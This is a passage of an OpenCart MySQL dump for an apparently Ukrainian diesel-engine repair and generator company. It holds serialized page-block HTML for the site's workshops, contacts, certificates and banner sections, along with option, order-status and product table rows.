src=&quot;../catalog/view/theme/service/js/swiper.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/bootstrap.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/scripts.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;	\";s:4:\"code\";s:1213:\"&lt;section class=&quot;workshops&quot;&gt;\r\n				&lt;div class=&quot;wide-body-layout&quot;&gt;\r\n					&lt;h2 class=&quot;section-title&quot;&gt;Наши цеха&lt;/h2&gt;\r\n					&lt;h3 class=&quot;section-subtitle&quot;&gt;занимают 0,7448 ГА ЗЕМЛИ НА КОТОРОЙ РАЗМЕЩЕНЫ ДВА ЦЕХА ПО РЕМОНТУ ДИЗЕЛЬНЫХ ДВИГАТЕЛЕЙ ПЛОЩАДЬЮ 814,6  М2 И 953,2 М2&lt;/h3&gt;\r\n					&lt;div class=&quot;our-workshops flex-wrapper&quot;&gt;\r\n						{{group name=&quot;workshops&quot;}}\r\n						&lt;div class=&quot;flex-item workshop borders borders-no-hover borders-hide-small&quot;&gt;\r\n							&lt;div class=&quot;borders-wrapper&quot;&gt;\r\n								&lt;figure&gt;{{&lt;img src=&quot;../image/workshop1.jpg&quot; alt=&quot;&quot;&gt;|img}}&lt;/figure&gt;\r\n								&lt;div class=&quot;figcapture&quot;&gt;{{участок ремонта и настройки топливной аппаратуры оборудованный стендом MOTORPAL, приборами ремонта форсунок и плунжерных пар}}&lt;/div&gt;\r\n							&lt;/div&gt;\r\n						&lt;/div&gt;\r\n						{{/group}}\r\n					&lt;/div&gt;\r\n				&lt;/div&gt;\r\n			&lt;/section&gt;\";s:6:\"fields\";a:3:{i:1;a:1:{s:9:\"workshops\";a:4:{i:0;a:2:{s:22:\"../image/workshop1.jpg\";a:6:{s:5:\"value\";s:31:\"catalog/workshops/workshop1.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:225:\"участок ремонта и настройки топливной аппаратуры оборудованный стендом MOTORPAL, приборами ремонта форсунок и плунжерных пар\";a:2:{s:5:\"value\";s:225:\"участок ремонта и настройки топливной аппаратуры оборудованный стендом MOTORPAL, приборами ремонта форсунок и плунжерных пар\";s:4:\"type\";s:9:\"undefined\";}}i:1;a:2:{s:22:\"../image/workshop1.jpg\";a:6:{s:5:\"value\";s:31:\"catalog/workshops/workshop1.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:225:\"участок ремонта и настройки топливной аппаратуры оборудованный стендом MOTORPAL, приборами ремонта форсунок и плунжерных пар\";a:2:{s:5:\"value\";s:225:\"участок ремонта и настройки топливной аппаратуры оборудованный стендом MOTORPAL, приборами ремонта форсунок и плунжерных пар\";s:4:\"type\";s:9:\"undefined\";}}i:2;a:2:{s:22:\"../image/workshop1.jpg\";a:6:{s:5:\"value\";s:31:\"catalog/workshops/workshop1.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:225:\"участок ремонта и настройки топливной аппаратуры оборудованный стендом MOTORPAL, приборами ремонта форсунок и плунжерных пар\";a:2:{s:5:\"value\";s:225:\"участок ремонта и настройки топливной аппаратуры оборудованный стендом MOTORPAL, приборами ремонта форсунок и плунжерных пар\";s:4:\"type\";s:9:\"undefined\";}}i:3;a:2:{s:22:\"../image/workshop1.jpg\";a:6:{s:5:\"value\";s:31:\"catalog/workshops/workshop1.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:225:\"участок ремонта и настройки топливной аппаратуры оборудованный стендом MOTORPAL, приборами ремонта форсунок и плунжерных пар\";a:2:{s:5:\"value\";s:225:\"участок ремонта и настройки топливной аппаратуры оборудованный стендом MOTORPAL, приборами ремонта форсунок и плунжерных пар\";s:4:\"type\";s:9:\"undefined\";}}}}i:3;a:1:{s:9:\"workshops\";a:1:{i:0;a:2:{s:22:\"../image/workshop1.jpg\";a:6:{s:5:\"value\";s:22:\"../image/workshop1.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:225:\"участок ремонта и настройки топливной аппаратуры оборудованный стендом MOTORPAL, приборами ремонта форсунок и плунжерных пар\";a:2:{s:5:\"value\";s:225:\"участок ремонта и настройки топливной аппаратуры оборудованный стендом MOTORPAL, приборами ремонта форсунок и плунжерных пар\";s:4:\"type\";s:9:\"undefined\";}}}}i:4;a:1:{s:9:\"workshops\";a:1:{i:0;a:2:{s:22:\"../image/workshop1.jpg\";a:6:{s:5:\"value\";s:22:\"../image/workshop1.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:225:\"участок ремонта и настройки топливной аппаратуры оборудованный стендом MOTORPAL, приборами ремонта форсунок и плунжерных пар\";a:2:{s:5:\"value\";s:225:\"участок ремонта и настройки топливной аппаратуры оборудованный стендом MOTORPAL, приборами ремонта форсунок и плунжерных пар\";s:4:\"type\";s:9:\"undefined\";}}}}}}'),(39,'Контакты','block','a:5:{s:4:\"name\";s:16:\"Контакты\";s:6:\"status\";s:1:\"1\";s:4:\"head\";s:1107:\"&lt;link href=&quot;../catalog/view/theme/service/stylesheet/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/swiper.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/stylesheet.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/adaptiveness.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/jquery-2.2.1.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/swiper.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/bootstrap.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/google_maps_api.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/scripts.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n\";s:4:\"code\";s:1217:\"&lt;section class=&quot;contacts&quot;&gt;\r\n			&lt;div class=&quot;wide-body-layout&quot;&gt;\r\n				&lt;div class=&quot;flex-wrapper&quot;&gt;\r\n					&lt;div class=&quot;flex-item&quot;&gt;{{&lt;img src=&quot;../image/house-image.jpg&quot; alt=&quot;&quot;&gt;|img}}&lt;/div&gt;\r\n					&lt;div class=&quot;flex-item&quot;&gt;\r\n						&lt;h3&gt;{{Телефоны}}&lt;/h3&gt;\r\n						&lt;p class=&quot;phone&quot;&gt;{{+380975465662 (бесплатно по Украине)}}&lt;/p&gt;\r\n						&lt;p class=&quot;phone&quot;&gt;{{+380970000000}}&lt;/p&gt;\r\n						&lt;p class=&quot;phone&quot;&gt;{{+380975556666}}&lt;/p&gt;\r\n					&lt;/div&gt;\r\n					&lt;div class=&quot;flex-item&quot;&gt;\r\n						&lt;h3&gt;{{Адрес}}&lt;/h3&gt;\r\n						&lt;p&gt;{{Производство и офис: Киевская обл., г. Вишнёвое, ул. Киевская 30 -А}}&lt;/p&gt;\r\n						&lt;p&gt;{{Для писем: 08132, Киевская обл., г. Вишневое, а/я 49а Украина}}&lt;/p&gt;\r\n					&lt;/div&gt;\r\n				&lt;/div&gt;\r\n			&lt;/div&gt;\r\n	&lt;div class=&quot;map&quot;&gt;\r\n			&lt;div id=&quot;map_canvas&quot;&gt;&lt;/div&gt;\r\n		&lt;/div&gt;\r\n		&lt;/section&gt;\r\n&lt;script&gt;\r\n\r\n\r\n&lt;/script&gt;\";s:6:\"fields\";a:3:{i:1;a:8:{s:24:\"../image/house-image.jpg\";a:6:{s:5:\"value\";s:23:\"catalog/house-image.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:16:\"Телефоны\";a:2:{s:5:\"value\";s:16:\"Телефоны\";s:4:\"type\";s:9:\"undefined\";}s:54:\"+380975465662 (бесплатно по Украине)\";a:2:{s:5:\"value\";s:54:\"+380975465662 (бесплатно по Украине)\";s:4:\"type\";s:9:\"undefined\";}s:13:\"+380970000000\";a:2:{s:5:\"value\";s:13:\"+380970000000\";s:4:\"type\";s:9:\"undefined\";}s:13:\"+380975556666\";a:2:{s:5:\"value\";s:13:\"+380975556666\";s:4:\"type\";s:9:\"undefined\";}s:10:\"Адрес\";a:2:{s:5:\"value\";s:10:\"Адрес\";s:4:\"type\";s:9:\"undefined\";}s:115:\"Производство и офис: Киевская обл., г. Вишнёвое, ул. Киевская 30 -А\";a:2:{s:5:\"value\";s:115:\"Производство и офис: Киевская обл., г. Вишнёвое, ул. Киевская 30 -А\";s:4:\"type\";s:9:\"undefined\";}s:99:\"Для писем: 08132, Киевская обл., г. Вишневое, а/я 49а Украина\";a:2:{s:5:\"value\";s:99:\"Для писем: 08132, Киевская обл., г. Вишневое, а/я 49а Украина\";s:4:\"type\";s:9:\"undefined\";}}i:3;a:8:{s:24:\"../image/house-image.jpg\";a:6:{s:5:\"value\";s:24:\"../image/house-image.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:16:\"Телефоны\";a:2:{s:5:\"value\";s:16:\"Телефоны\";s:4:\"type\";s:9:\"undefined\";}s:54:\"+380975465662 (бесплатно по Украине)\";a:2:{s:5:\"value\";s:54:\"+380975465662 (бесплатно по Украине)\";s:4:\"type\";s:9:\"undefined\";}s:13:\"+380970000000\";a:2:{s:5:\"value\";s:13:\"+380970000000\";s:4:\"type\";s:9:\"undefined\";}s:13:\"+380975556666\";a:2:{s:5:\"value\";s:13:\"+380975556666\";s:4:\"type\";s:9:\"undefined\";}s:10:\"Адрес\";a:2:{s:5:\"value\";s:10:\"Адрес\";s:4:\"type\";s:9:\"undefined\";}s:115:\"Производство и офис: Киевская обл., г. Вишнёвое, ул. Киевская 30 -А\";a:2:{s:5:\"value\";s:115:\"Производство и офис: Киевская обл., г. Вишнёвое, ул. Киевская 30 -А\";s:4:\"type\";s:9:\"undefined\";}s:99:\"Для писем: 08132, Киевская обл., г. Вишневое, а/я 49а Украина\";a:2:{s:5:\"value\";s:99:\"Для писем: 08132, Киевская обл., г. Вишневое, а/я 49а Украина\";s:4:\"type\";s:9:\"undefined\";}}i:4;a:8:{s:24:\"../image/house-image.jpg\";a:6:{s:5:\"value\";s:24:\"../image/house-image.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:16:\"Телефоны\";a:2:{s:5:\"value\";s:16:\"Телефоны\";s:4:\"type\";s:9:\"undefined\";}s:54:\"+380975465662 (бесплатно по Украине)\";a:2:{s:5:\"value\";s:54:\"+380975465662 (бесплатно по Украине)\";s:4:\"type\";s:9:\"undefined\";}s:13:\"+380970000000\";a:2:{s:5:\"value\";s:13:\"+380970000000\";s:4:\"type\";s:9:\"undefined\";}s:13:\"+380975556666\";a:2:{s:5:\"value\";s:13:\"+380975556666\";s:4:\"type\";s:9:\"undefined\";}s:10:\"Адрес\";a:2:{s:5:\"value\";s:10:\"Адрес\";s:4:\"type\";s:9:\"undefined\";}s:115:\"Производство и офис: Киевская обл., г. Вишнёвое, ул. Киевская 30 -А\";a:2:{s:5:\"value\";s:115:\"Производство и офис: Киевская обл., г. Вишнёвое, ул. Киевская 30 -А\";s:4:\"type\";s:9:\"undefined\";}s:99:\"Для писем: 08132, Киевская обл., г. Вишневое, а/я 49а Украина\";a:2:{s:5:\"value\";s:99:\"Для писем: 08132, Киевская обл., г. Вишневое, а/я 49а Украина\";s:4:\"type\";s:9:\"undefined\";}}}}'),(40,'Сертификаты','block','a:5:{s:4:\"name\";s:22:\"Сертификаты\";s:6:\"status\";s:1:\"1\";s:4:\"head\";s:970:\"&lt;link href=&quot;../catalog/view/theme/service/stylesheet/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/swiper.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/stylesheet.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/adaptiveness.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/jquery-2.2.1.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/swiper.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/bootstrap.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/scripts.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;	\";s:4:\"code\";s:480:\"&lt;div class=&quot;certificates&quot;&gt;\r\n	&lt;div class=&quot;wide-body-layout&quot;&gt;\r\n		&lt;div class=&quot;flex-wrapper certificates-lightbox&quot;&gt;\r\n			{{group name=&quot;certificates&quot;}}\r\n			&lt;a data-toggle=&quot;lightbox&quot; class=&quot;certificate&quot; href=&quot;../image/certificate.jpg&quot;&gt;\r\n				{{&lt;img src=&quot;../image/certificate.jpg&quot; alt=&quot;&quot;&gt;|img}}\r\n			&lt;/a&gt;\r\n			{{/group}}\r\n		&lt;/div&gt;\r\n	&lt;/div&gt;\r\n&lt;/div&gt;\";s:6:\"fields\";a:3:{i:1;a:1:{s:12:\"certificates\";a:4:{i:0;a:1:{s:24:\"../image/certificate.jpg\";a:6:{s:5:\"value\";s:36:\"catalog/Certificates/certificate.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}}i:1;a:1:{s:24:\"../image/certificate.jpg\";a:6:{s:5:\"value\";s:36:\"catalog/Certificates/certificate.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}}i:2;a:1:{s:24:\"../image/certificate.jpg\";a:6:{s:5:\"value\";s:36:\"catalog/Certificates/certificate.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}}i:3;a:1:{s:24:\"../image/certificate.jpg\";a:6:{s:5:\"value\";s:26:\"catalog/warranty-image.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}}}}i:3;a:1:{s:12:\"certificates\";a:1:{i:0;a:1:{s:24:\"../image/certificate.jpg\";a:6:{s:5:\"value\";s:24:\"../image/certificate.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}}}}i:4;a:1:{s:12:\"certificates\";a:1:{i:0;a:1:{s:24:\"../image/certificate.jpg\";a:6:{s:5:\"value\";s:24:\"../image/certificate.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}}}}}}'),(41,'Заглавное фото 2','block','a:5:{s:4:\"name\";s:29:\"Заглавное фото 2\";s:6:\"status\";s:1:\"1\";s:4:\"head\";s:969:\"&lt;link href=&quot;../catalog/view/theme/service/stylesheet/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/swiper.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/stylesheet.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;link href=&quot;../catalog/view/theme/service/stylesheet/adaptiveness.css&quot; rel=&quot;stylesheet&quot;&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/jquery-2.2.1.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/swiper.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/bootstrap.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\r\n&lt;script src=&quot;../catalog/view/theme/service/js/scripts.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\";s:4:\"code\";s:600:\"&lt;section class=&quot;motivation-image motivation-image-2&quot;&gt;\r\n			{{&lt;img src=&quot;../image/main-image.jpg&quot; alt=&quot;&quot;&gt;|img}}\r\n			&lt;div class=&quot;wide-body-layout&quot;&gt;\r\n				&lt;div class=&quot;motivation-text&quot;&gt;\r\n					&lt;small&gt;{{SPECSERVICE}}&lt;/small&gt;\r\n					&lt;div class=&quot;main-text&quot;&gt;{{Надежность}}&lt;/div&gt;\r\n					&lt;div class=&quot;main-text&quot;&gt;{{Стабильность}}&lt;/div&gt;\r\n					&lt;div class=&quot;main-text&quot;&gt;{{Доверие}}&lt;/div&gt;\r\n				&lt;/div&gt;\r\n			&lt;/div&gt;\r\n		&lt;/section&gt;\";s:6:\"fields\";a:3:{i:1;a:5:{s:23:\"../image/main-image.jpg\";a:6:{s:5:\"value\";s:26:\"catalog/main-picture-2.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:11:\"SPECSERVICE\";a:2:{s:5:\"value\";s:11:\"SPECSERVICE\";s:4:\"type\";s:9:\"undefined\";}s:20:\"Надежность\";a:2:{s:5:\"value\";s:20:\"Надежность\";s:4:\"type\";s:9:\"undefined\";}s:24:\"Стабильность\";a:2:{s:5:\"value\";s:24:\"Стабильность\";s:4:\"type\";s:9:\"undefined\";}s:14:\"Доверие\";a:2:{s:5:\"value\";s:14:\"Доверие\";s:4:\"type\";s:9:\"undefined\";}}i:3;a:5:{s:23:\"../image/main-image.jpg\";a:6:{s:5:\"value\";s:23:\"../image/main-image.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:11:\"SPECSERVICE\";a:2:{s:5:\"value\";s:11:\"SPECSERVICE\";s:4:\"type\";s:9:\"undefined\";}s:20:\"Надежность\";a:2:{s:5:\"value\";s:20:\"Надежность\";s:4:\"type\";s:9:\"undefined\";}s:24:\"Стабильность\";a:2:{s:5:\"value\";s:24:\"Стабильность\";s:4:\"type\";s:9:\"undefined\";}s:14:\"Доверие\";a:2:{s:5:\"value\";s:14:\"Доверие\";s:4:\"type\";s:9:\"undefined\";}}i:4;a:5:{s:23:\"../image/main-image.jpg\";a:6:{s:5:\"value\";s:23:\"../image/main-image.jpg\";s:5:\"width\";s:0:\"\";s:6:\"height\";s:0:\"\";s:3:\"alt\";s:0:\"\";s:5:\"title\";s:0:\"\";s:4:\"type\";s:3:\"img\";}s:11:\"SPECSERVICE\";a:2:{s:5:\"value\";s:11:\"SPECSERVICE\";s:4:\"type\";s:9:\"undefined\";}s:20:\"Надежность\";a:2:{s:5:\"value\";s:20:\"Надежность\";s:4:\"type\";s:9:\"undefined\";}s:24:\"Стабильность\";a:2:{s:5:\"value\";s:24:\"Стабильность\";s:4:\"type\";s:9:\"undefined\";}s:14:\"Доверие\";a:2:{s:5:\"value\";s:14:\"Доверие\";s:4:\"type\";s:9:\"undefined\";}}}}');
/*!40000 ALTER TABLE `oc_module` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_option` WRITE;
/*!40000 ALTER TABLE `oc_option` DISABLE KEYS */;
INSERT INTO `oc_option` VALUES (1,'radio',1),(2,'checkbox',2),(4,'text',3),(5,'select',4),(6,'textarea',5),(7,'file',6),(8,'date',7),(9,'time',8),(10,'datetime',9),(11,'select',10),(12,'date',11),(13,'radio',0);
/*!40000 ALTER TABLE `oc_option` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_option_description` WRITE;
/*!40000 ALTER TABLE `oc_option_description` DISABLE KEYS */;
INSERT INTO `oc_option_description` VALUES (1,3,'Appearance execution'),(2,1,'Checkbox'),(4,1,'Text'),(6,1,'Textarea'),(8,1,'Date'),(7,1,'File'),(5,1,'Select'),(9,1,'Time'),(10,1,'Date &amp; Time'),(12,1,'Delivery Date'),(11,1,'Size'),(10,4,'Date &amp; Time'),(9,4,'Time'),(5,4,'Select'),(7,4,'File'),(8,4,'Date'),(6,4,'Textarea'),(4,4,'Text'),(2,4,'Checkbox'),(1,1,'Вид исполнения'),(2,3,'Checkbox'),(4,3,'Text'),(6,3,'Textarea'),(8,3,'Date'),(7,3,'File'),(5,3,'Select'),(9,3,'Time'),(10,3,'Date &amp; Time'),(12,3,'Delivery Date'),(11,3,'Size'),(12,4,'Delivery Date'),(11,4,'Size'),(13,1,'Вид доставки'),(13,3,'Вид доставки'),(13,4,'Вид доставки'),(1,4,'Вид виконання');
/*!40000 ALTER TABLE `oc_option_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_option_value` WRITE;
/*!40000 ALTER TABLE `oc_option_value` DISABLE KEYS */;
INSERT INTO `oc_option_value` VALUES (43,1,'',3),(31,1,'',2),(45,2,'',4),(44,2,'',3),(42,5,'',4),(41,5,'',3),(39,5,'',1),(40,5,'',2),(32,1,'',1),(23,2,'',1),(24,2,'',2),(46,11,'',1),(47,11,'',2),(48,11,'',3),(49,13,'',0),(50,13,'',0),(51,1,'',0);
/*!40000 ALTER TABLE `oc_option_value` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_option_value_description` WRITE;
/*!40000 ALTER TABLE `oc_option_value_description` DISABLE KEYS */;
INSERT INTO `oc_option_value_description` VALUES (31,4,1,'Кожух'),(31,3,1,'Housing'),(45,1,2,'Checkbox 4'),(44,1,2,'Checkbox 3'),(42,1,5,'Yellow'),(41,1,5,'Green'),(39,1,5,'Red'),(40,1,5,'Blue'),(23,1,2,'Checkbox 1'),(24,1,2,'Checkbox 2'),(48,1,11,'Large'),(47,1,11,'Medium'),(46,1,11,'Small'),(24,4,2,'Checkbox 2'),(23,4,2,'Checkbox 1'),(40,4,5,'Blue'),(39,4,5,'Red'),(41,4,5,'Green'),(42,4,5,'Yellow'),(31,1,1,'Кожух'),(44,4,2,'Checkbox 3'),(45,4,2,'Checkbox 4'),(32,4,1,'Відкрите'),(32,3,1,'Open'),(45,3,2,'Checkbox 4'),(44,3,2,'Checkbox 3'),(32,1,1,'Открытое'),(42,3,5,'Yellow'),(41,3,5,'Green'),(39,3,5,'Red'),(40,3,5,'Blue'),(23,3,2,'Checkbox 1'),(24,3,2,'Checkbox 2'),(48,3,11,'Large'),(47,3,11,'Medium'),(46,3,11,'Small'),(48,4,11,'Large'),(47,4,11,'Medium'),(46,4,11,'Small'),(49,1,13,'Один'),(49,3,13,'Один'),(49,4,13,'Один'),(50,1,13,'Два '),(50,3,13,'Два '),(50,4,13,'Два'),(43,1,1,'В капоте'),(43,3,1,'In the hood'),(43,4,1,'В капоті'),(51,1,1,'В контейнере'),(51,3,1,'Container'),(51,4,1,'У контейнері');
/*!40000 ALTER TABLE `oc_option_value_description` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_order` WRITE;
/*!40000 ALTER TABLE `oc_order` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_order` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_order_custom_field` WRITE;
/*!40000 ALTER TABLE `oc_order_custom_field` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_order_custom_field` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_order_history` WRITE;
/*!40000 ALTER TABLE `oc_order_history` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_order_history` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_order_option` WRITE;
/*!40000 ALTER TABLE `oc_order_option` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_order_option` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_order_product` WRITE;
/*!40000 ALTER TABLE `oc_order_product` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_order_product` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_order_recurring` WRITE;
/*!40000 ALTER TABLE `oc_order_recurring` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_order_recurring` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_order_recurring_transaction` WRITE;
/*!40000 ALTER TABLE `oc_order_recurring_transaction` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_order_recurring_transaction` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_order_status` WRITE;
/*!40000 ALTER TABLE `oc_order_status` DISABLE KEYS */;
INSERT INTO `oc_order_status` VALUES (1,1,'Ожидание'),(2,1,'В обработке'),(3,1,'Доставлено'),(7,1,'Отменено'),(5,1,'Сделка завершена'),(8,1,'Возврат'),(9,1,'Отмена и аннулирование'),(10,1,'Неудавшийся'),(11,1,'Возмещенный'),(12,1,'Полностью измененный'),(13,1,'Полный возврат'),(12,4,'Полностью измененный'),(11,4,'Возмещенный'),(10,4,'Неудавшийся'),(9,4,'Отмена и аннулирование'),(8,4,'Возврат'),(5,4,'Сделка завершена'),(7,4,'Отменено'),(3,4,'Доставлено'),(2,4,'В обработке'),(1,4,'Ожидание'),(1,3,'Ожидание'),(2,3,'В обработке'),(3,3,'Доставлено'),(7,3,'Отменено'),(5,3,'Сделка завершена'),(8,3,'Возврат'),(9,3,'Отмена и аннулирование'),(10,3,'Неудавшийся'),(11,3,'Возмещенный'),(12,3,'Полностью измененный'),(13,3,'Полный возврат'),(13,4,'Полный возврат');
/*!40000 ALTER TABLE `oc_order_status` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_order_total` WRITE;
/*!40000 ALTER TABLE `oc_order_total` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_order_total` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_order_voucher` WRITE;
/*!40000 ALTER TABLE `oc_order_voucher` DISABLE KEYS */;
/*!40000 ALTER TABLE `oc_order_voucher` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product` WRITE;
/*!40000 ALTER TABLE `oc_product` DISABLE KEYS */;
INSERT INTO `oc_product` VALUES (70,'SSD - 10','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'7400.0000',0,0,'2016-04-12','482.00000000',1,'130.00000000','60.00000000','115.00000000',1,1,1,1,1,5,'2016-07-18 20:24:33','2016-07-19 17:11:32',0,0,0,0,0,''),(71,'SSD - 16','','','','','','','',1,7,'catalog/SSD.jpg',11,1,'8400.0000',0,0,'2016-04-12','535.00000000',1,'140.00000000','60.00000000','115.00000000',1,1,1,1,1,7,'2016-07-18 20:32:11','2016-07-19 17:11:59',0,0,0,0,0,''),(42,'Product 15','','','','','','','',990,5,'catalog/demo/apple_cinema_30.jpg',8,1,'100.0000',400,9,'2009-02-04','12.50000000',1,'1.00000000','2.00000000','3.00000000',1,1,2,0,1,32,'2009-02-03 21:07:37','2016-03-11 03:47:14',2,0,0,0,0,''),(50,'SSI-40 ','','','','','','','',1,7,'catalog/SSI.jpg',11,1,'0.0000',0,0,'2016-04-12','860.00000000',1,'175.00000000','65.00000000','140.00000000',1,1,1,1,1,48,'2016-04-12 13:15:04','2016-07-19 17:14:55',1,0,0,0,0,''),(53,'SSI-64','','','','','','','',1,7,'catalog/SSI.jpg',11,1,'0.0000',0,0,'2016-04-12','1000.00000000',1,'200.00000000','65.00000000','145.00000000',1,1,1,1,1,16,'2016-04-12 13:57:54','2016-07-19 17:15:12',0,0,0,0,0,''),(52,'SSI-96 ','','','','','','','',1,7,'catalog/SSI.jpg',11,1,'0.0000',0,0,'2016-04-12','1220.00000000',1,'225.00000000','80.00000000','150.00000000',1,1,1,1,1,17,'2016-04-12 13:57:26','2016-07-19 17:15:30',0,0,0,0,0,''),(54,'SSI-136 